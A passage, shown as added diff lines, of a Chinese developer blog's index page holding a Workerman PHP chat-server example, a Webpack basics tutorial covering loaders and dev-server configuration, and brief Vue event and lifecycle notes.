+<h2 id="4，使用"><a href="#4，使用" class="headerlink" title="4，使用"></a>4，使用</h2><p>把下载下来的压缩包解压，并在文件夹中新建一个start.php的文件<br><img src="https://raw.githubusercontent.com/tangchunwei/MyImage/master/%E5%90%AF%E5%8A%A8%E6%96%87%E4%BB%B6.png" alt="image"><br>把以下代码复制进去！<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">use</span> <span class="hljs-title">Workerman</span>\<span class="hljs-title">Worker</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//Autoloader.php路径</span></span><br><span class="line"><span class="hljs-keyword">require_once</span> <span class="hljs-string">"./Autoloader.php"</span>;</span><br><span class="line"></span><br><span class="line">$global_uid = <span class="hljs-number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 当客户端连上来时分配uid，并保存连接，并通知所有客户端</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle_connection</span><span class="hljs-params">($connection)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">global</span> $text_worker, $global_uid;</span><br><span class="line">    <span class="hljs-comment">// 为这个连接分配一个uid</span></span><br><span class="line">    $connection-&gt;uid = ++$global_uid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 当客户端发送消息过来时，转发给所有人</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle_message</span><span class="hljs-params">($connection, $data)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">global</span> $text_worker;</span><br><span class="line">    <span class="hljs-keyword">foreach</span>($text_worker-&gt;connections <span class="hljs-keyword">as</span> $conn)</span><br><span class="line">    &#123;</span><br><span class="line">        $conn-&gt;send(<span class="hljs-string">"user[&#123;$connection-&gt;uid&#125;] said: $data"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 当客户端断开时，广播给所有客户端</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle_close</span><span class="hljs-params">($connection)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">global</span> $text_worker;</span><br><span class="line">    <span class="hljs-keyword">foreach</span>($text_worker-&gt;connections <span class="hljs-keyword">as</span> $conn)</span><br><span class="line">    &#123;</span><br><span class="line">        $conn-&gt;send(<span class="hljs-string">"user[&#123;$connection-&gt;uid&#125;] logout"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 创建一个文本协议的Worker监听2347接口</span></span><br><span class="line">$text_worker = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">"text://127.0.0.1:2347"</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 只启动1个进程，这样方便客户端之间传输数据</span></span><br><span class="line">$text_worker-&gt;count = <span class="hljs-number">1</span>;</span><br><span class="line"></span><br><span class="line">$text_worker-&gt;onConnect = <span class="hljs-string">'handle_connection'</span>;</span><br><span class="line">$text_worker-&gt;onMessage = <span class="hljs-string">'handle_message'</span>;</span><br><span class="line">$text_worker-&gt;onClose = <span class="hljs-string">'handle_close'</span>;</span><br><span class="line"></span><br><span class="line">Worker::runAll();</span><br></pre></td></tr></table></figure></p>
+<h2 id="5-运行"><a href="#5-运行" class="headerlink" title="5,运行"></a>5,运行</h2><p>在当前文件夹打开终端，并输入php start.php start 打开socket服务，如图：<br><img src="https://raw.githubusercontent.com/tangchunwei/MyImage/master/%E5%BC%80%E5%90%AFworkerman%E6%9C%8D%E5%8A%A1.png" alt="image"><br>打开多几个客户端并输入命令：telnet 127.0.0.1 2347 测试,如下图，则代表测试成功：<br><img src="https://raw.githubusercontent.com/tangchunwei/MyImage/master/%E6%B5%8B%E8%AF%95.png" alt="image"></p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-11-15T01:50:13.563Z">2018-11-15</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/前端/">前端</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    7 分钟 读完 (大约 1103 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/11/15/Webpack基本使用/">Webpack基本使用</a>
+            
+        </h1>
+        <div class="content">
+            <blockquote>
+<p>Webpack介绍:主要用于web项目中打包资源进行自动构建,Webpack将所有资源视为JS的模块来进行构建，所以对于CSS，Image等非JS类型的文件，Webpack会使用相应的加载(loader)器来加载成其可识别的JS模块资源,通过配置一些信息，就能将资源进行打包构建，更好地实现前端的工程化</p>
+</blockquote>
+<h2 id="Webpack安装"><a href="#Webpack安装" class="headerlink" title="Webpack安装"></a>Webpack安装</h2><p>本地安装:<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install -D webpack</span><br><span class="line">-D 实际上是简写  --dev-save</span><br></pre></td></tr></table></figure></p>
+<p>如果你使用Webpack 4+ 版本, 你还需要安装CLI.</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -D webpack-cli</span><br></pre></td></tr></table></figure>
+<p>要安装<strong>特定</strong>版本<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -D webpack@&lt;version&gt;</span><br></pre></td></tr></table></figure></p>
+<p>全局安装:<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g webpack</span><br></pre></td></tr></table></figure></p>
+<p>配置项简介：</p>
+<ol>
+<li>Entry，入口文件配置,Webpack执行构建的第一步将从entry开始,完成整个工程的打包</li>
+<li>Module，模块,在Webpack里,一切皆模块,Webpack会从配置的entry开始递归找出所有依赖的模块,最常用的是rules配置项,功能是匹配对应的后缀,从而针对代码文件完成格式转换和压缩合并等指定的操作.</li>
+<li>Loader，模块转换器,用于把模块原内容按照需求转换成新内容,这个是配合Module模块中的rules中的配置项来使用.</li>
+<li>Plugins，扩展插件,在Webpack构建流程中的特定时机注入扩展逻辑来改变构建结果或做你想要做的事情.(插件API)</li>
+<li>Output，输出结果,在Webpack经过一系列处理并得出最终想要的代码后输出结果,配置项用于指定输出文件夹,默认是./dist</li>
+</ol>
+<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p>把src的代码编译到dist目录中</p>
+<p><strong>project</strong> </p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">handle</span><br><span class="line">|- package.json</span><br><span class="line">|- webpack.config.js</span><br><span class="line">|- index.html</span><br><span class="line">|- /src</span><br><span class="line">  |- index.js</span><br><span class="line">  |- mixin.js</span><br><span class="line">|- /dist</span><br><span class="line">  |- bundle.js</span><br></pre></td></tr></table></figure>
+<p><strong>src/index.js</strong><br><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span>  content  <span class="hljs-keyword">from</span> <span class="hljs-string">"./mixin"</span>;</span><br><span class="line"><span class="hljs-built_in">document</span>.body.appendChild(content(<span class="hljs-string">"webpack"</span>));</span><br></pre></td></tr></table></figure></p>
+<p><strong>src/mixin.js</strong></p>
+<figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">con</span>) </span>&#123;</span><br><span class="line">  <span class="hljs-keyword">var</span> element = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'div'</span>);</span><br><span class="line"></span><br><span class="line">  element.innerHTML = <span class="hljs-string">'Hello, '</span> + con;</span><br><span class="line">  <span class="hljs-keyword">return</span> element;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>index.html</strong> </p>
+<figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>起步<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">   <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./dist/bundle.js"</span>&gt;</span><span class="hljs-undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>.npmrc</strong></p>
+<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>
+<p><strong>webpack.config.js</strong></p>
+<figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="hljs-comment">// 打包的入口点</span></span><br><span class="line">  entry: <span class="hljs-string">'./src/index.js'</span>,</span><br><span class="line">  <span class="hljs-comment">// 打包的输出点</span></span><br><span class="line">  output: &#123;</span><br><span class="line">      <span class="hljs-comment">// 打包之后输出文件的名称</span></span><br><span class="line">    filename: <span class="hljs-string">'bundle.js'</span>,</span><br><span class="line">      <span class="hljs-comment">// 打包之后输出文件的路径</span></span><br><span class="line">    path: path.resolve(__dirname, <span class="hljs-string">'dist'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>webpack 的基本使用方式 :</p>
+<ol>
+<li>配置package.json的start命令为webpack</li>
+<li>创建webpack.config.js</li>
+<li>指定项目打包的入口</li>
+<li>指定项目打包后文件的名称和输出路径</li>
+</ol>
+<h2 id="配置代码错误源"><a href="#配置代码错误源" class="headerlink" title="配置代码错误源"></a>配置代码错误源</h2><p>如果报错了，是这样子的：</p>
+<p><img src="https://raw.githubusercontent.com/tangchunwei/MyImage/master/1530470923756.png" alt="image"></p>
+<p>我们需要知道代码的具体错误,如图：</p>
+<p><img src="https://raw.githubusercontent.com/tangchunwei/MyImage/master/1530470953644.png" alt="image"></p>
+<p>修改配置文件：</p>
+<p><strong>webpack.config.js</strong></p>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">devtool: <span class="hljs-string">'inline-source-map'</span>,</span><br><span class="line">&lt;!--去掉警告提示--&gt;</span><br><span class="line">mode: <span class="hljs-string">'none'</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/tangchunwei/MyImage/master/1530471203270.png" alt="image"></p>
+<h2 id="webpack加载CSS"><a href="#webpack加载CSS" class="headerlink" title="webpack加载CSS"></a>webpack加载CSS</h2><p>下载包<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -D style-loader css-loader</span><br></pre></td></tr></table></figure></p>
+<p>引入资源</p>
+<p><strong>src/js/index.js</strong></p>
+<figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// 引入css</span></span><br><span class="line"><span class="hljs-keyword">import</span> <span class="hljs-string">'../css/main.css'</span></span><br></pre></td></tr></table></figure>
+<p>修改配置文件</p>
+<p><strong>webpack.config.js</strong><br><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">module</span>: &#123;</span><br><span class="line">  rules: [</span><br><span class="line">    <span class="hljs-comment">// 加载css</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="hljs-comment">// 找到css文件()</span></span><br><span class="line">      test: <span class="hljs-regexp">/\.css$/</span>,</span><br><span class="line">      <span class="hljs-comment">// 需要转换器(需要什么转换器 都是大家都知道的 style-loader css-loader)</span></span><br><span class="line">      use: [<span class="hljs-string">'style-loader'</span>, <span class="hljs-string">'css-loader'</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="webpack加载图片"><a href="#webpack加载图片" class="headerlink" title="webpack加载图片"></a>webpack加载图片</h2><p>下载包<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -D file-loader</span><br></pre></td></tr></table></figure></p>
+<p>引入资源</p>
+<p><strong>src/js/index.js</strong></p>
+<figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// 引入图片</span></span><br><span class="line"><span class="hljs-keyword">const</span> imgSrc = <span class="hljs-built_in">require</span>(<span class="hljs-string">'../image/chrome.png'</span>);</span><br></pre></td></tr></table></figure>
+<p>修改配置文件</p>
+<p><strong>webpack.config.js</strong><br><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rules: [</span><br><span class="line">  &#123;</span><br><span class="line">    test: <span class="hljs-regexp">/\.(png|jpe?g|gif|svg)$/</span>,</span><br><span class="line">    use: [<span class="hljs-string">'file-loader'</span>]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
+<h2 id="webpack加载字体"><a href="#webpack加载字体" class="headerlink" title="webpack加载字体"></a>webpack加载字体</h2><ol>
+<li>下载字体</li>
+<li><p>定义字体</p>
+<figure class="highlight css hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@<span class="hljs-keyword">font-face</span> &#123;</span><br><span class="line">  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'wanlum'</span>;</span><br><span class="line">  <span class="hljs-attribute">src</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">"../fonts/Raleway.ttf"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用字体</p>
+<figure class="highlight css hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-selector-tag">div</span> &#123;</span><br><span class="line">  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'wanlum'</span>;</span><br><span class="line">  <span class="hljs-attribute">color</span>: red;</span><br><span class="line">  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">30px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置webpack.config.js</p>
+<figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        test: <span class="hljs-regexp">/\.(woff|woff2|eot|ttf|otf)$/</span>,</span><br><span class="line">        use: [</span><br><span class="line">          <span class="hljs-string">'file-loader'</span></span><br><span class="line">        ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="webpack编译ES6"><a href="#webpack编译ES6" class="headerlink" title="webpack编译ES6"></a>webpack编译ES6</h2><ol>
+<li><p>下载包</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -D babel-cli babel-preset-env babel-loader</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>编辑配置文件 .babelrc</p>
+<figure class="highlight json hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="hljs-attr">"presets"</span>: [</span><br><span class="line">    <span class="hljs-string">"env"</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置webpack.config.js</p>
+<figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">       test: <span class="hljs-regexp">/\.js$/</span>,</span><br><span class="line">       exclude: <span class="hljs-regexp">/node_modules/</span>,</span><br><span class="line">       use: &#123;</span><br><span class="line">         loader: <span class="hljs-string">'babel-loader'</span></span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="less编译成css"><a href="#less编译成css" class="headerlink" title="less编译成css"></a>less编译成css</h2><ol>
+<li><p>下载包</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install less-loader less -D</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置webpack.config.js</p>
+<figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">     test: <span class="hljs-regexp">/\.less$/</span>,</span><br><span class="line">     use: [<span class="hljs-string">'style-loader'</span>,<span class="hljs-string">'css-loader'</span>, <span class="hljs-string">'less-loader'</span>]</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="html自动生成"><a href="#html自动生成" class="headerlink" title="html自动生成"></a>html自动生成</h2><ol>
+<li><p>下载包</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -D html-webpack-plugin clean-webpack-plugin</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>引入包</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 重新生成html的</span><br><span class="line">const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);</span><br><span class="line">// 清理dist目录</span><br><span class="line">const CleanWebpackPlugin = require(&apos;clean-webpack-plugin&apos;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置webpack.config.js</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">  new HtmlWebpackPlugin(&#123;</span><br><span class="line">    title: &quot;你好&quot;</span><br><span class="line">  &#125;),</span><br><span class="line">  // 清理dist目录</span><br><span class="line">  new CleanWebpackPlugin([&apos;dist&apos;])</span><br><span class="line">],</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="自动编译实时加载"><a href="#自动编译实时加载" class="headerlink" title="自动编译实时加载"></a>自动编译实时加载</h2><ol>
+<li><p>下载包</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -D webpack-dev-server</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置webpack.config.js</p>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">devServer: &#123;</span><br><span class="line">    contentBase: <span class="hljs-string">'./dist'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置package.json启动项</p>
+<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"start": "webpack-dev-server --config webpack.config.js"</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="热替换-跟自动编译实时加载功能差不多"><a href="#热替换-跟自动编译实时加载功能差不多" class="headerlink" title="热替换(跟自动编译实时加载功能差不多)"></a>热替换(跟自动编译实时加载功能差不多)</h2><ol>
+<li>配置webpack.config.js<figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">  <span class="hljs-keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">    title: <span class="hljs-string">'使用HtmlWebpackPlugin'</span></span><br><span class="line">  &#125;),</span><br><span class="line">   <span class="hljs-keyword">new</span> webpack.NamedModulesPlugin([<span class="hljs-string">'dist'</span>]),</span><br><span class="line">    <span class="hljs-keyword">new</span> webpack.HotModuleReplacementPlugin([<span class="hljs-string">'dist'</span>])</span><br><span class="line">],</span><br><span class="line"> devServer: &#123;</span><br><span class="line">   contentBase: path.resolve(__dirname,<span class="hljs-string">'dist'</span>),</span><br><span class="line">   hot: <span class="hljs-literal">true</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-11-15T01:50:13.559Z">2018-11-15</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/前端/">前端</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    2 分钟 读完 (大约 243 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/11/15/Vue之事件与函数/">Vue之事件与函数</a>
+            
+        </h1>
+        <div class="content">
+            <blockquote>
+<p>记录常用的事件以及函数</p>
+</blockquote>
+<h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><ol>
+<li>.stop：阻止事件继续传播</li>
+<li>.prevent：组上事件的默认行为</li>
+<li>.capture：事件在捕获阶段执行</li>
+<li>.once：事件只被触发执行一次</li>
+</ol>
+<h2 id="按键修饰符"><a href="#按键修饰符" class="headerlink" title="按键修饰符"></a>按键修饰符</h2><ol>
+<li>.enter：点击回车键</li>
+<li>.tab：点击tab键</li>
+<li>.delete：点击删除键</li>
+<li>.esc：点击 esc 按键</li>
+<li>.space：点击空格键</li>
+<li>.up：点击上箭头</li>
+<li>.down：点击下箭头</li>
+<li>.left：点击左箭头</li>
+<li>.right：点击右箭头</li>
+<li>.数字：按键的数字编号</li>
+</ol>
+<h2 id="生命周期钩子"><a href="#生命周期钩子" class="headerlink" title="生命周期钩子"></a>生命周期钩子</h2><ol>
+<li>beforeCreated：创建前</li>
+<li>created：创建后</li>
+<li>beforeMount：挂载到页面前</li>
+<li>mounted：挂载到页面后</li>
+<li>beforeUpdate：更新页面前</li>
+<li>updated：更新页面后</li>
+<li>beforeDestroy：消销Vue之前</li>
+<li>destroyed：消销Vue之后</li>
+</ol>
+<h2 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h2><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">computed:&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h2 id="自定义组件"><a href="#自定义组件" class="headerlink" title="自定义组件"></a>自定义组件</h2><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(<span class="hljs-string">'hello'</span>, &#123;</span><br><span class="line">    template: <span class="hljs-string">`&lt;p&gt;Hello World !&lt;/p&gt;`</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>注意点：</p>
+<ul>
+<li>组件中的 data 要求必须是一个函数</li>
+<li>使用 props 组件上所有属性的名字</li>
+</ul>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-11-15T01:50:13.555Z">2018-11-15</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/Geek/">Geek</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    5 分钟 读完 (大约 754 个字)
+                </span>
+                
+            </div>
+        </div>
